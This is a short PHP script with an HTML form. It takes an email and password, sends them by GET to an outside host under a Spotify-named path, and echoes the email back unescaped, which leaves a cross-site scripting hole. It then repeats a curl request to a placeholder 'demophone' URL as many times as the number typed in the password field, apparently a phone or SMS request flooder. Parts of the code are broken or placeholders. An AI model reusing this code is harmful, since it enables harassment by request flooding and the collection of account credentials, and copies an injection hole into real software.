<?php
  $email=$_GET['email'];
   if( isset($_GET["email"]) ) {
      echo "Email :". $_GET['email']. "<br />";
      
      for ($i=1; $i <= $_GET['password'] ; $i++) { 
         $curl = curl_init();
         curl_setopt_array($curl, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'sitename?demophone=$no',
    CURLOPT_USERAGENT => 'Test request'));
    $resp = curl_exec($curl);
    curl_close($curl); 
      }
      
      exit();
   }
?>
<meta name="viewport" content="width=device-width, initial-scale=1">
<html>
   <body>
   
      <form action = "http://www.sbsseh.com/cek/Spotify/api/" method = "GET">
            Email: <input type = "name" name = "email" />
<br>
         Password: <input type = "name" name = "password" />
<br>
<br>
         <input type = "submit" />
      </form>
      
   </body>
</html>